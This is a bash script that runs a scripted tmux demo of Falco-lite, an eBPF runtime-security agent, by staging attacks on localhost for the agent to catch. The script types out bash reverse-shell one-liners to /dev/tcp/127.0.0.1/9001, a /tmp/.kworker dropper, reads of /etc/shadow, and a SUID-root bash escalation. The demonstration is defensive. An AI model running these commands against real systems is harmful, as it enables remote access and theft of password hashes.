#!/bin/bash
set -u

cd "$(dirname "$0")/.."
ROOT=$PWD
SHOW=/srv/falco-demo
SOCK=falcoshow
AGENT_MARK="-j $SHOW/alerts.json"
GOLD=$'\e[38;5;179m'
DIM=$'\e[2m'
BOLD=$'\e[1m'
RESET=$'\e[0m'

t() {
	tmux -L "$SOCK" "$@"
}

type_into() {
	local pane=$1 text=$2
	local c
	for ((i = 0; i < ${#text}; i++)); do
		c=${text:i:1}
		[ "$c" = ";" ] && c="\;"
		t send-keys -t "$pane" -l -- "$c"
		sleep 0.012
	done
	t send-keys -t "$pane" Enter
}

caption() {
	local title=$1 hint=$2
	shift 2
	clear
	printf '\n  %s%s%s%s\n\n' "$BOLD" "$GOLD" "$title" "$RESET"
	for line in "$@"; do
		printf '  %s\n' "$line"
	done
	printf '\n  %s%s%s' "$DIM" "$hint" "$RESET"
}

wait_key() {
	local key rest
	while IFS= read -rsn1 -t 0.01 _; do :; done
	while true; do
		key=
		rest=
		IFS= read -rsn1 key
		if [ "$key" = $'\e' ]; then
			IFS= read -rsn5 -t 0.05 rest
			key+=$rest
		fi
		while IFS= read -rsn1 -t 0.01 _; do :; done
		case "$key" in
		q | Q | й | Й)
			t kill-server
			exit 0
			;;
		"" | " " | $'\e[6~' | $'\e[C' | $'\e[B')
			return
			;;
		esac
	done
}

agent_running() {
	pgrep -f -- "$AGENT_MARK" >/dev/null
}

stop_demo() {
	: > "$SHOW/stopped"
	caption "Demo stopped" "any key ▸ close" "$1"
	read -rsn1 _
	t kill-server
	exit 1
}

step() {
	local title=$1 before=$2 after=$3
	shift 3
	caption "$title" "Enter ▸ run    q ▸ quit" "$before"
	wait_key
	"$@" || stop_demo "Falco-lite is not running (see the bottom pane), so no attack is run."
	caption "$title" "Enter ▸ next    q ▸ quit" "$before" "" "$GOLD▸$RESET $after"
	wait_key
}

scene_open_shell() {
	type_into "$ATTACKER" "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'"
	sleep 2
	type_into "$LISTENER" "id; hostname"
	sleep 1.5
}

scene_close_shell() {
	type_into "$LISTENER" "exit"
	sleep 1
}

scene_start_agent() {
	t send-keys -t "$AGENT" C-l
	type_into "$AGENT" "./falco-lite -c rules.yaml $AGENT_MARK"
	for _ in $(seq 100); do
		t capture-pane -p -t "$AGENT" | grep -q watching && return 0
		sleep 0.1
	done
	return 1
}

scene_reverse_shell() {
	agent_running || return 1
	type_into "$ATTACKER" "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'"
	sleep 2
}

scene_detached_shell() {
	agent_running || return 1
	type_into "$ATTACKER" "setsid -f bash -c 'sleep 1; bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'"
	sleep 3
	t send-keys -t "$ATTACKER" Enter
}

scene_dropper() {
	agent_running || return 1
	type_into "$ATTACKER" "cp $SHOW/payload /tmp/.kworker && cd /tmp && ./.kworker"
	sleep 2
}

scene_shadow() {
	agent_running || return 1
	type_into "$ATTACKER" "cat /etc/shadow"
	sleep 1.5
}

scene_suid() {
	agent_running || return 1
	install -o root -g root -m 4755 /usr/bin/bash "$SHOW/backup-tool"
	type_into "$ATTACKER" "ls -l $SHOW/backup-tool"
	sleep 1
	type_into "$ATTACKER" "$SHOW/backup-tool -p -c 'id; head -1 /etc/shadow'"
	sleep 2
	rm -f "$SHOW/backup-tool"
}

scene_miner() {
	agent_running || return 1
	type_into "$ATTACKER" "python3 $SHOW/miner.py"
	sleep 2.5
}

scene_summary() {
	t send-keys -t "$AGENT" C-c
	sleep 2
	t resize-pane -t "$AGENT" -y $(($(t display -p '#{window_height}') - 14))
	t send-keys -t "$AGENT" C-l
	t clear-history -t "$AGENT"
	type_into "$AGENT" "python3 -I demo/show_summary.py $SHOW/alerts.json"
	sleep 1
}

driver() {
	for _ in $(seq 100); do
		[ -s "$SHOW/panes" ] && break
		sleep 0.1
	done
	source "$SHOW/panes"
	trap 't kill-server' EXIT

	caption "Falco-lite · live demo" "Enter ▸ start    q ▸ quit" \
		"Runtime security for Linux, written in C on top of eBPF." \
		"" \
		"Top left:     the attacker — a web shell inside php-fpm, running as an unprivileged user." \
		"Top right:    the attacker's own machine, waiting for an incoming shell on 127.0.0.1:9001." \
		"Bottom:       the Falco-lite agent. Everything runs on this laptop."
	wait_key

	step "1 · No protection" \
		"The web shell opens a reverse shell to the attacker. Falco-lite is not running." \
		"The attacker now types commands on the server (top right). This is what we want to stop." \
		scene_open_shell
	scene_close_shell

	step "2 · Start Falco-lite" \
		"The agent loads its eBPF programs into the kernel and reads its rules from YAML. No kernel module, no reboot." \
		"Loaded. The kernel now streams exec, fork, exit, connect, open, setuid and ptrace events to the agent." \
		scene_start_agent

	step "3 · The same reverse shell" \
		"Exactly the same command as in step 1." \
		"Killed. A shell whose ancestor is the web server connected outward. The agent prints the process tree and its reaction time." \
		scene_reverse_shell

	step "4 · Hide the parent" \
		"setsid -f: the parent exits at once, the orphaned shell connects a second later." \
		"Still killed. The agent keeps exited parents in its process tree while their children live." \
		scene_detached_shell

	step "5 · Drop a payload in /tmp" \
		"The attacker drops a binary named .kworker into /tmp and starts it with a relative path." \
		"Killed at exec. The kernel reports the full path, so ./.kworker is seen as /tmp/.kworker." \
		scene_dropper

	step "6 · Steal password hashes" \
		"The attacker tries to read /etc/shadow." \
		"Denied by the OS, and reported anyway: the agent watches the file itself, failed attempts included." \
		scene_shadow

	step "7 · Privilege escalation" \
		"A misconfigured SUID-root binary is found on the server. Running it would give a root shell." \
		"Killed the moment the process became root, before it could print anything." \
		scene_suid

	step "8 · Crypto-miner" \
		"A miner disguised as a Python script connects to a mining pool on port 3333." \
		"Killed on connect. The rule matches stratum pool ports, whatever the program is called." \
		scene_miner

	step "Summary" \
		"Stop the agent and look at what it recorded." \
		"Each alert is one JSON line, ready for syslog or a SIEM. Thank you." \
		scene_summary

	caption "Falco-lite · live demo" "any key ▸ close" "End of the demo."
	read -rsn1 _
}

if [ "${1:-}" = "--driver" ]; then
	driver
	exit 0
fi

if [ "$(id -u)" != 0 ]; then
	echo "run as root: sudo bash demo/show.sh"
	exit 1
fi

USER_NAME=${SUDO_USER:-${1:-}}
if [ -z "$USER_NAME" ] || [ "$USER_NAME" = root ]; then
	echo "usage: sudo bash demo/show.sh   (run from your normal user account)"
	exit 1
fi
USER_HOME=$(getent passwd "$USER_NAME" | cut -d: -f6)
if [ -z "$USER_HOME" ] || [ ! -d "$USER_HOME" ]; then
	echo "unknown user or missing home directory: $USER_NAME"
	exit 1
fi

for tool in tmux nc python3 gcc; do
	if ! command -v "$tool" >/dev/null; then
		echo "missing tool: $tool"
		exit 1
	fi
done

if [ ! -x ./falco-lite ]; then
	echo "build first: make"
	exit 1
fi

COLS=$(tput cols)
ROWS=$(tput lines)
if [ "$COLS" -lt 160 ] || [ "$ROWS" -lt 45 ]; then
	echo "The terminal is ${COLS}x${ROWS}. Make it at least 160x45: maximize the window or make the font smaller."
	exit 1
fi

POOL=
cleanup() {
	t kill-server 2>/dev/null
	pkill -INT -f -- "$AGENT_MARK" 2>/dev/null
	[ -n "$POOL" ] && kill "$POOL" 2>/dev/null
	rm -f "$SHOW/backup-tool" /tmp/.kworker
}
trap cleanup EXIT

rm -rf "$SHOW"
mkdir -p "$SHOW"
chmod 755 "$SHOW"
cp /usr/bin/bash "$SHOW/php-fpm"
printf '#include <unistd.h>\nint main(void) { for (;;) pause(); }\n' | gcc -x c -O2 -o "$SHOW/payload" -
chmod 755 "$SHOW/payload"
printf 'import socket\nsocket.create_connection(("127.0.0.1", 3333)).recv(9)\n' > "$SHOW/miner.py"
chmod 644 "$SHOW/miner.py"

echo "Preflight: watching this machine for 5 seconds in dry-run mode..."
./falco-lite -n -j "$SHOW/preflight.json" > "$SHOW/preflight.log" 2>&1 &
PRE=$!
started=0
for _ in $(seq 100); do
	if grep -q watching "$SHOW/preflight.log"; then
		started=1
		break
	fi
	sleep 0.1
done
if [ "$started" = 0 ]; then
	kill -INT "$PRE" 2>/dev/null
	echo "Falco-lite did not start:"
	cat "$SHOW/preflight.log"
	exit 1
fi
sleep 5
kill -INT "$PRE"
wait "$PRE" 2>/dev/null
if [ -s "$SHOW/preflight.json" ]; then
	echo "Falco-lite would act on these processes that are already running here:"
	python3 -I demo/show_summary.py "$SHOW/preflight.json"
	read -rp "Continue with the live demo anyway? [y/N] " answer
	[ "$answer" = y ] || exit 1
fi

nc -lk 127.0.0.1 3333 >/dev/null 2>&1 &
POOL=$!

ATTACKER_CMD="runuser -u $(printf %q "$USER_NAME") -- env HOME=$(printf %q "$USER_HOME") PS1='\[\e[38;5;179m\]\u@\h\[\e[0m\] \$ ' $SHOW/php-fpm --norc --noprofile -i"
AGENT_CMD="env PS1='\[\e[38;5;179m\]root@\h\[\e[0m\] # ' bash --norc --noprofile -i"
LISTENER_CMD="bash -c 'while true; do printf \"\\e[2mwaiting for a shell on 127.0.0.1:9001 ...\\e[0m\\n\"; nc -l 127.0.0.1 9001; printf \"\\e[38;5;179m[connection closed]\\e[0m\\n\\n\"; sleep 0.3; done'"

t kill-server 2>/dev/null
t -f /dev/null new-session -d -s show -x "$COLS" -y "$ROWS" -c "$ROOT" "bash $(printf %q "$ROOT/demo/show.sh") --driver"
t set -g status off
t set -g pane-border-status top
t set -g pane-border-format ' #{pane_title} '
t set -g pane-border-style 'fg=colour240'
t set -g pane-active-border-style 'fg=colour179'
t set -g mouse off

DRIVER=$(t display -p -t show:0.0 '#{pane_id}')
ATTACKER=$(t split-window -v -t "$DRIVER" -l $((ROWS - 13)) -c "$USER_HOME" -P -F '#{pane_id}' "$ATTACKER_CMD")
AGENT=$(t split-window -v -t "$ATTACKER" -l 50% -c "$ROOT" -P -F '#{pane_id}' "$AGENT_CMD")
LISTENER=$(t split-window -h -t "$ATTACKER" -l 30% -P -F '#{pane_id}' "$LISTENER_CMD")

t select-pane -t "$DRIVER" -T "DEMO"
t select-pane -t "$ATTACKER" -T "ATTACKER · web shell in php-fpm, user $USER_NAME"
t select-pane -t "$LISTENER" -T "ATTACKER'S MACHINE · 127.0.0.1:9001"
t select-pane -t "$AGENT" -T "FALCO-LITE · defender"
printf 'ATTACKER=%s\nLISTENER=%s\nAGENT=%s\n' "$ATTACKER" "$LISTENER" "$AGENT" > "$SHOW/panes"
t send-keys -t "$AGENT" "clear; echo 'Falco-lite is not running yet.'" Enter
t select-pane -t "$DRIVER"

TMUX= t attach -t show
[ -e "$SHOW/stopped" ] && exit 1
exit 0
